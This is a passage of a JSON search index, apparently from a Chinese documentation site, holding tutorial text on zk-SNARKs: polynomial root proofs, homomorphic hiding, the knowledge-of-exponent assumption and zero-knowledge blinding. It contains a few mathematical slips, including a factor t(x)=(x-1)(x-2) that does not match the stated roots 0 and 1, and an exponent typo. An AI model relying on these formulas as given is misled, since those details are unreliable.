\u200b\u8981\u200b\u8bc1\u660e\u200b\u81ea\u5df1\u200b\u62e5\u6709\u200b\u8d85\u8fc7\u200b\u4e00\u4e07\u5757\u200b\u7684\u200b\u5b58\u6b3e\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u200b\u5e0c\u671b\u200b Verifier \u200b\u77e5\u9053\u200b\u81ea\u5df1\u200b\u5177\u4f53\u200b\u6709\u200b\u591a\u5c11\u200b\u5b58\u6b3e\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5c31\u200b\u9700\u8981\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_2","title":"\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u8bc1\u660e","text":""},{"location":"cryptography/zk_snark.html#_3","title":"\u6734\u7d20\u200b\u8bc1\u660e","text":"<p>\u200b\u9996\u5148\u200b\u6765\u770b\u200b\u4e00\u4e2a\u200b\u573a\u666f\u200b\uff1aProver \u200b\u77e5\u9053\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u4e5f\u200b\u77e5\u9053\u200b\u5b83\u200b\u6709\u200b\u54ea\u4e9b\u200b\u6839\u200b\uff0c\u200b\u73b0\u5728\u200b\u5047\u8bbe\u200b\u8fd9\u4e9b\u200b\u6839\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e5f\u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u73b0\u5728\u200b Prover \u200b\u60f3\u8981\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u6709\u200b\u67d0\u200b\u51e0\u4e2a\u200b\u6839\u200b\uff08\u200b\u4e0d\u662f\u200b\u5168\u90e8\u200b\uff09\uff0c\u200b\u4f46\u200b\u53c8\u200b\u4e0d\u60f3\u200b\u544a\u8bc9\u200b Verifier \u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u7cfb\u6570\u200b\u662f\u200b\u591a\u5c11\u200b\uff0c\u200b\u600e\u4e48\u200b\u5b9e\u73b0\u200b\u5462\u200b\uff1f</p> <p>\u200b\u4f8b\u5982\u200b \\(p(x)=x^3-3x^2+2x\\)\uff0c\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6240\u6709\u200b\u6839\u662f\u200b \\(0, 1, 2\\)\uff0c\u200b\u60f3\u8981\u200b\u5411\u200b Verifier \u200b\u8bc1\u660e\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6839\u200b \\(0, 1\\)\uff0c\u200b\u600e\u4e48\u200b\u8bc1\u660e\u200b\u5462\u200b\uff1f</p> <p>\u200b\u5bf9\u4e8e\u200b Verifier \u200b\u6765\u8bf4\u200b\uff0c\u200b\u516c\u5f00\u200b\u4fe1\u606f\u200b\u662f\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u56fa\u5b9a\u200b\u7684\u200b\u672a\u77e5\u200b\u7cfb\u6570\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u5b83\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6839\u200b \\(0, 1\\)\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u4e00\u5b9a\u200b\u5e26\u6709\u200b\u4e00\u4e2a\u200b\u56e0\u200b\u5f0f\u200b \\(t(x)=(x-1)(x-2)\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5b58\u5728\u200b\u6574\u200b\u7cfb\u6570\u200b\u591a\u9879\u5f0f\u200b \\(h(x)\\) \u200b\u6ee1\u8db3\u200b\uff1a</p> \\[ p(x)=t(x)h(x)=(x-1)(x-2)h(x) \\] <p>\u200b\u90a3\u4e48\u200b\u5e26\u5165\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b \\(x\\)\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b \\(p(x)\\) \u200b\u548c\u200b \\(h(x)\\) \u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\u3002\u200b\u5982\u679c\u200b Prover \u200b\u60f3\u200b\u6b3a\u9a97\u200b Verifier\uff0c\u200b\u5b83\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u5e76\u200b\u6ca1\u6709\u200b\u6240\u200b\u8981\u200b\u8bc1\u660e\u200b\u7684\u200b\u6839\u200b\uff0c\u200b\u4f8b\u5982\u200b \\(p(1) \\ne 0\\)\uff0c\u200b\u90a3\u4e48\u200b \\(x-1\\) \u200b\u5c31\u200b\u4e0d\u662f\u200b \\(p(x)\\) \u200b\u7684\u200b\u56e0\u5f0f\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u200b\u6ca1\u6cd5\u200b\u6574\u9664\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b \\(h(x)\\)\u3002\u200b\u6240\u4ee5\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8bbe\u8ba1\u200b\u51fa\u200b\u8fd9\u6837\u200b\u7684\u200b\u4e00\u4e2a\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\uff1a</p> <ol> <li>Verifier \u200b\u968f\u673a\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u6574\u6570\u200b \\(x_0\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Prover</li> <li>Prover \u200b\u8ba1\u7b97\u200b \\(p(x_0)\\) \u200b\u548c\u200b \\(h(x_0)\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u8ba1\u7b97\u200b\uff0c\u200b\u5982\u679c\u200b\u53d1\u73b0\u200b \\(p(x_0)=(x_0-1)(x_0-2)h(x_0)\\)\uff0c\u200b\u5e76\u4e14\u200b \\(p(x_0)\\) \u200b\u548c\u200b \\(h(x_0)\\) \u200b\u90fd\u200b\u662f\u200b\u6574\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8bf4\u660e\u200b\u6ca1\u6709\u200b\u51fa\u9519\u200b</li> </ol> <p>\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b Prover \u200b\u6b3a\u9a97\u200b\u4e86\u200b Verifier\uff0c\u200b\u90a3\u4e48\u200b\u8ba1\u7b97\u200b \\(h(x_0)\\) \u200b\u4e00\u6b65\u200b\u7684\u200b\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u200b\u95ee\u9898\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5e76\u200b\u4e0d\u200b\u5b58\u5728\u200b\u6574\u9664\u200b\u7684\u200b \\(h(x_0)\\)\u3002\u200b\u4f8b\u5982\u200b \\(p(x)=2x^3-3x^2+2x\\)\uff0c\u200b\u60f3\u8981\u200b\u8bc1\u660e\u200b\u6709\u200b\u56e0\u5f0f\u200b \\(t(x)=(x-1)(x-2)\\)\uff0c\u200b\u5982\u679c\u200b Verifier \u200b\u968f\u673a\u200b\u51fa\u200b\u4e00\u4e2a\u200b \\(x=4\\)\uff0c\u200b\u90a3\u4e48\u200b \\(p(x)=88\\)\uff0c\\(t(x)=6\\)\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e0d\u200b\u6574\u9664\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0cProver \u200b\u8bc1\u660e\u200b\u5931\u8d25\u200b\u3002</p> <p>\u200b\u4e0d\u8fc7\u200b\uff0c\u200b\u8fd8\u662f\u200b\u6709\u200b\u4e00\u5b9a\u200b\u6982\u7387\u200b\uff0c\u200b\u867d\u7136\u200b\u591a\u9879\u5f0f\u200b\u4e0d\u200b\u6574\u9664\u200b\uff0c\u200b\u4f46\u662f\u200b\u7b97\u200b\u51fa\u6765\u200b\u7684\u200b\u6570\u662f\u200b\u53ef\u4ee5\u200b\u6574\u9664\u200b\u7684\u200b\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u5c31\u662f\u200b\u591a\u6b21\u200b\u8fdb\u884c\u200b\u4e0a\u9762\u200b\u7684\u200b\u6d41\u7a0b\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u7528\u200b\u4e00\u4e2a\u200b\u4e0d\u540c\u200b\u7684\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u968f\u7740\u200b\u968f\u673a\u200b\u6b21\u6570\u200b\u589e\u52a0\u200b\uff0c\u200b\u8bc1\u660e\u200b\u7684\u200b\u53ef\u4fe1\u5ea6\u200b\u5c31\u200b\u8d8a\u200b\u9ad8\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ee3\u4ef7\u200b\u4e5f\u200b\u5c31\u200b\u968f\u4e4b\u200b\u4e0a\u5347\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b Prover \u200b\u8fd8\u662f\u200b\u6709\u200b\u4f5c\u5f0a\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u968f\u673a\u200b\u4e00\u4e2a\u200b\u503c\u200b\u5c31\u200b\u5f53\u6210\u200b \\(h(x_0)\\)\uff0c\u200b\u7136\u540e\u200b\u8ba1\u7b97\u200b \\(p(x_0)=t(x_0)h(x_0)\\)\uff0c\u200b\u518d\u200b\u53d1\u7ed9\u200b Verifier\u3002\u200b\u6b64\u65f6\u200b Prover \u200b\u5176\u5b9e\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4e00\u4e2a\u200b\u6574\u9664\u200b \\(t(x)\\) \u200b\u7684\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\u3002</p>"},{"location":"cryptography/zk_snark.html#_4","title":"\u540c\u6001\u200b\u52a0\u5bc6","text":"<p>\u200b\u65e2\u7136\u200b Prover \u200b\u53ef\u4ee5\u200b\u4f2a\u9020\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u662f\u5426\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u540c\u6001\u200b\u52a0\u5bc6\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8ba9\u200b Prover \u200b\u53ef\u4ee5\u200b\u8fdb\u884c\u200b\u591a\u9879\u5f0f\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u53c8\u200b\u65e0\u6cd5\u200b\u4f2a\u9020\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff1f</p> <p>\u200b\u7b54\u6848\u200b\u662f\u200b\u53ef\u4ee5\u200b\uff0c\u200b\u53c2\u8003\u200b RSA \u200b\u6216\u8005\u200b Diffie-Hellman \u200b\u7684\u200b\u601d\u8def\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u5bf9\u200b\u67d0\u4e2a\u200b\u6570\u505a\u200b\u8fd0\u7b97\u200b\uff0c\u200b\u4f46\u662f\u200b\u53c8\u200b\u4e0d\u200b\u66b4\u9732\u200b\u8fd9\u4e2a\u200b\u6570\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u5728\u200b\u7d20\u6570\u200b\u57df\u200b\u4e0a\u200b\u8fdb\u884c\u200b\u6307\u6570\u200b\u8fd0\u7b97\u200b\uff1a</p> \\[ E(v) = g^v \\pmod n \\] <p>\u200b\u5176\u4e2d\u200b \\(v\\) \u200b\u662f\u200b\u539f\u59cb\u6570\u636e\u200b\uff0c\\(g\\) \u200b\u662f\u200b\u5bc6\u94a5\u200b\uff0c\u200b\u90a3\u4e48\u200b Verifier \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(E(v)\\) \u200b\u4ee5\u540e\u200b\uff0c\u200b\u628a\u200b \\(E(v)\\) \u200b\u4ea4\u7ed9\u200b Prover \u200b\u53bb\u200b\u8ba1\u7b97\u200b\u3002Prover \u200b\u4e0d\u200b\u77e5\u9053\u200b \\(g\\) \u200b\u548c\u200b \\(v\\)\uff0c\u200b\u53ea\u80fd\u200b\u8001\u8001\u5b9e\u5b9e\u200b\u5730\u53bb\u200b\u5e26\u5165\u200b\u591a\u9879\u5f0f\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\u3002\u200b\u539f\u6765\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u52a0\u6cd5\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b \\(E(x)\\) \u200b\u7684\u200b\u4e58\u6cd5\u200b\u3002\u200b\u539f\u6765\u200b\u591a\u9879\u5f0f\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u6570\u4e58\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b \\(E(x)\\) \u200b\u7684\u200b\u5e42\u200b\u8fd0\u7b97\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u79cd\u200b\u65b9\u6cd5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7f3a\u70b9\u200b\uff0c\u200b\u5c31\u662f\u200b\u65e0\u6cd5\u200b\u8fdb\u884c\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u4e2d\u200b \\(x\\) \u200b\u7684\u200b\u4e58\u6cd5\u200b\uff1a\u200b\u5df2\u77e5\u200b \\(g^a\\) \u200b\u548c\u200b \\(g^b\\)\uff0c\u200b\u65e0\u6cd5\u200b\u8ba1\u7b97\u200b \\(g^{ab}\\)\u3002\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u4ece\u200b \\(E(x)\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b \\(E(x^2)\\)\uff0c\u200b\u53ea\u80fd\u200b\u8ba1\u7b97\u200b \\(E(2x)=E(x)^2\\)\u3002\u200b\u6240\u4ee5\u200b\u6c42\u200b \\(E(x^i)\\) \u200b\u8fd9\u200b\u4e00\u6b65\u200b\u9700\u8981\u200b\u7531\u200b Verifier \u200b\u63d0\u524d\u5b8c\u6210\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b \\(p(x)=x^3-3x^2+x\\)\uff0c\u200b\u5c31\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> \\[\\begin{align} E(x^3)^1E(x^2)^{-3}E(x)^1 &amp;= (g^{x^3})^1(g^{x^2})^{-3}(g^x)^1 \\\\ &amp;= g^{x^3}g^{-3x^2}g^x \\\\ &amp;= g^{x^2-3x^2+x} \\end{align}\\] <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u5c31\u662f\u200b\u628a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u8fd0\u7b97\u200b\u632a\u5230\u200b\u4e86\u200b\u6307\u6570\u200b\u4e0a\u9762\u200b\u3002\u200b\u4f46\u662f\u200b Prover \u200b\u770b\u5230\u200b\u7684\u200b\u53ea\u662f\u200b \\(E(x^3), E(x^2), E(x)\\)\uff0c\u200b\u5e76\u4e0d\u77e5\u9053\u200b\u5b9e\u9645\u200b\u7684\u200b \\(x\\) \u200b\u662f\u200b\u591a\u5c11\u200b\u3002</p> <p>\u200b\u6b64\u65f6\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u7ed9\u200b Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) \u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(E(p(s))\\) \u200b\u548c\u200b \\(E(h(s))^{t(s)}\\)\uff0c\u200b\u5224\u65ad\u200b\u4e24\u8005\u200b\u662f\u5426\u200b\u76f8\u7b49\u200b\uff1a\\(E(h(s))^{t(s)}=(g^{h(s)})^{t(s)}=g^{h(s)t(s)}=g^{p(s)}=E(p(s))\\)</li> </ol> <p>\u200b\u6ce8\u610f\u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\u8fd9\u200b\u4e00\u6b65\u200b\u53ea\u6709\u200b Verifier \u200b\u624d\u80fd\u200b\u505a\u200b\uff0c\u200b\u56e0\u4e3a\u200b Prover \u200b\u5e76\u4e0d\u77e5\u9053\u200b \\(s\\) \u200b\u7684\u200b\u503c\u200b\u3002</p> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u534f\u8bae\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b Prover \u200b\u771f\u7684\u200b\u7528\u200b\u4e86\u200b \\(E(s^i)\\) \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u7ed3\u679c\u200b\u3002\u200b\u6240\u4ee5\u200b\u63a5\u4e0b\u6765\u200b\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5982\u4f55\u200b\u4fdd\u8bc1\u200b Prover \u200b\u771f\u7684\u200b\u62ff\u200b \\(E(s^i)\\) \u200b\u53bb\u200b\u5e26\u5165\u200b\u5230\u200b \\(E(p(s))\\) \u200b\u7684\u200b\u8ba1\u7b97\u200b\u4e2d\u200b\u53bb\u200b\uff0c\u200b\u5e76\u4e14\u200b\u628a\u200b\u7ed3\u679c\u200b\u53d1\u7ed9\u200b Verifier\u3002</p>"},{"location":"cryptography/zk_snark.html#knowledge-of-exponent-assumption","title":"Knowledge-of-Exponent Assumption","text":"<p>\u200b\u5bf9\u4e8e\u200b\u4e0a\u9762\u200b\u95ee\u9898\u200b\u7684\u200b\u4e00\u79cd\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u8ba9\u200b Prover \u200b\u53ef\u4ee5\u200b\u8bc1\u660e\u200b\u5b83\u200b\u786e\u5b9e\u200b\u5bf9\u200b\u4e00\u4e2a\u200b\u6570\u505a\u200b\u4e86\u200b\u4e58\u6cd5\u200b\uff08\u200b\u5bf9\u5e94\u200b\u4e0a\u9762\u200b\u7684\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff09\u3002\u200b\u601d\u8def\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a</p> <ol> <li>Verifier \u200b\u6709\u200b\u4e00\u4e2a\u200b\u6570\u200b \\(a\\)\uff0c\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b Prover \u200b\u5bf9\u200b \\(a\\) \u200b\u8fdb\u884c\u200b\u4e86\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ea\u200b\u8fdb\u884c\u200b\u4e86\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\u3002</li> <li>Verifier \u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b \\(\\alpha\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(a' = a^{\\alpha} \\pmod n\\)\uff0c\u200b\u628a\u200b \\(a\\) \u200b\u548c\u200b \\(a'\\) \u200b\u53d1\u9001\u7ed9\u200b Prover</li> <li>Prover \u200b\u8981\u200b\u5bf9\u200b \\(a\\) \u200b\u8fdb\u884c\u200b\u6a21\u5e42\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u6b21\u6570\u200b\u662f\u200b \\(c\\)\uff0c\u200b\u90a3\u4e48\u200b\u9700\u8981\u200b\u8ba1\u7b97\u200b \\(b=a^c \\pmod n\\) \u200b\u4ee5\u53ca\u200b \\(b' = (a')^c \\pmod n\\)\uff0c\u200b\u628a\u200b \\(b\\) \u200b\u548c\u200b \\(b'\\) \u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u9a8c\u8bc1\u200b\uff1a\\(b^{\\alpha} = b' \\pmod n\\)</li> </ol> <p>\u200b\u5982\u679c\u200b\u9a8c\u8bc1\u200b\u6b63\u786e\u200b\uff0c\u200b\u8bf4\u660e\u200b Prover \u200b\u5bf9\u200b\u4e24\u4e2a\u200b\u6570\u200b \\(a\\) \u200b\u548c\u200b \\(a'\\) \u200b\u6c42\u200b\u4e86\u200b\u540c\u6837\u200b\u6b21\u6570\u200b\u7684\u200b\u5e42\u200b\uff08\u200b\u5bf9\u5e94\u200b\u591a\u9879\u5f0f\u200b\u91cc\u200b\uff0c\u200b\u4e58\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u6574\u200b\u7cfb\u6570\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u5bf9\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u6570\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u4e0d\u80fd\u200b\u4fdd\u8bc1\u200b\u9a8c\u8bc1\u200b\u901a\u8fc7\u200b\u3002\u200b\u56de\u987e\u200b\u4e0a\u200b\u4e00\u200b\u5c0f\u8282\u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u90e8\u5206\u200b\uff1aProver \u200b\u60f3\u8981\u200b\u4f5c\u5f0a\u200b\u7684\u8bdd\u200b\uff0c\u200b\u9700\u8981\u200b\u6784\u9020\u200b\u4e00\u4e2a\u200b \\(E(h(s))\\) \u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b \\(E(p(s))\\)\uff0c\u200b\u5982\u679c\u200b\u5bf9\u200b \\(E(h(s))\\) \u200b\u6216\u8005\u200b \\(E(p(s))\\) \u200b\u8fdb\u884c\u200b\u4e0a\u8ff0\u200b\u5904\u7406\u200b\uff0c\u200b\u90a3\u4e48\u200b \\(E(h(s))\\) \u200b\u548c\u200b \\(E(p(s))\\) \u200b\u5c31\u200b\u53ea\u80fd\u200b\u662f\u200b\u5bf9\u200b \\(E(s^i)\\) \u200b\u6c42\u200b \\(c\\) \u200b\u6b21\u65b9\u200b\u8ba1\u7b97\u51fa\u6765\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u8fd9\u200b\u6b63\u597d\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u6c42\u503c\u200b\u8fc7\u7a0b\u200b\u3002</p> <p>\u200b\u6362\u53e5\u8bdd\u8bf4\u200b\uff0c\u200b\u7ed9\u5b9a\u200b \\(1, s, s^2, \\ldots, s^d\\) \u200b\u8fd9\u4e9b\u200b\u503c\u200b\uff0c\u200b\u8981\u6c42\u200b\u53ea\u80fd\u200b\u7528\u200b\u8fd9\u4e9b\u200b\u6570\u200b\u8fdb\u884c\u200b\u52a0\u6cd5\u200b\u548c\u200b\u6570\u4e58\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u7ed3\u679c\u200b\u4e00\u5b9a\u200b\u662f\u200b\u67d0\u4e2a\u200b\u591a\u9879\u5f0f\u200b\u5728\u200b \\(s\\) \u200b\u5904\u200b\u7684\u200b\u53d6\u503c\u200b\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u6b64\u65f6\u200b\u7684\u200b\u5b8c\u6574\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\alpha\\)\uff0c\u200b\u5e26\u5165\u200b \\(E(s^i)^{\\alpha} = g^{\\alpha{}s^{i}}\\)</li> <li>Verifier \u200b\u7ed9\u200b Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\) \u200b\u548c\u200b \\(E(s^0)^{\\alpha}, E(s^1)^{\\alpha}, \\ldots, E(s^d)^{\\alpha}\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) \u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(\\alpha{}p(s)), E(h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u5224\u65ad\u200b \\(E(p(s))=E(h(s))^{t(s)}\\) \u200b\u4ee5\u53ca\u200b \\(E(p(s))^{\\alpha}=E(\\alpha{}p(s))\\)</li> </ol> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u8bc1\u660e\u200b\u4e86\u200b\u4e24\u70b9\u200b\uff1a</p> <ol> <li>\\(E(p(s))=E(h(s))^{t(s)}\\) \u200b\u8bc1\u660e\u200b\u4e86\u200b \\(t(x)\\) \u200b\u662f\u200b \\(p(x)\\) \u200b\u7684\u200b\u56e0\u5f0f\u200b</li> <li>\\(E(p(s))^{\\alpha}=E(\\alpha{}p(s))\\) \u200b\u8bc1\u660e\u200b\u4e86\u200b \\(p(x)\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b</li> </ol> <p>\u200b\u9700\u8981\u200b\u6ce8\u660e\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5e76\u200b\u6ca1\u6709\u200b\u4fdd\u8bc1\u200b Prover \u200b\u6bcf\u6b21\u200b\u7528\u200b\u540c\u4e00\u4e2a\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\)\uff0c\u200b\u53ea\u662f\u200b\u8bc1\u660e\u200b\u4e86\u200b Prover \u200b\u77e5\u9053\u200b\u4e00\u4e2a\u200b\u6574\u9664\u200b \\(t(x)\\) \u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6b21\u6570\u200b\u4e0d\u200b\u8d85\u8fc7\u200b \\(d\\)\u3002</p>"},{"location":"cryptography/zk_snark.html#_5","title":"\u96f6\u200b\u77e5\u8bc6","text":"<p>\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u8ba9\u200b Verifier \u200b\u5bf9\u200b\u591a\u9879\u5f0f\u200b\u5b9e\u73b0\u200b\u96f6\u200b\u77e5\u8bc6\u200b\uff0c\u200b\u5f88\u200b\u7b80\u5355\u200b\uff1aProver \u200b\u8fd4\u56de\u200b\u7684\u200b\u4e09\u4e2a\u200b\u503c\u200b\uff0c\u200b\u518d\u6c42\u200b\u4e00\u4e2a\u200b\u968f\u673a\u6570\u200b \\(\\delta\\) \u200b\u6b21\u65b9\u200b\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u7cfb\u6570\u200b\u5168\u90e8\u200b\u4e58\u4ee5\u200b \\(\\delta\\)\uff0c\u200b\u90a3\u4e48\u200b\u7ed3\u679c\u200b\u4f9d\u7136\u200b\u6ee1\u8db3\u200b Verifier \u200b\u8981\u200b\u5224\u65ad\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7b49\u5f0f\u200b\uff0c\u200b\u4f46\u662f\u200b Verifier \u200b\u5c31\u200b\u6ca1\u200b\u529e\u6cd5\u200b\u63a8\u65ad\u200b\u591a\u9879\u5f0f\u200b\u5177\u4f53\u200b\u7684\u200b\u7cfb\u6570\u200b\u4e86\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u53d8\u6210\u200b\u4e86\u200b\uff1a</p> <ol> <li>Verifier \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(s\\) \u200b\u7684\u200b\u5e42\u6b21\u200b\uff0c\u200b\u518d\u200b\u5e26\u5165\u200b \\(E(v)\\)\uff1a\\(E(s^i) = g^{s^i}\\)</li> <li>Verifier \u200b\u8ba1\u7b97\u200b \\(E(s^i)^{\\alpha} = g^{\\alpha{}s^{i}}\\)</li> <li>Verifier \u200b\u7ed9\u200b 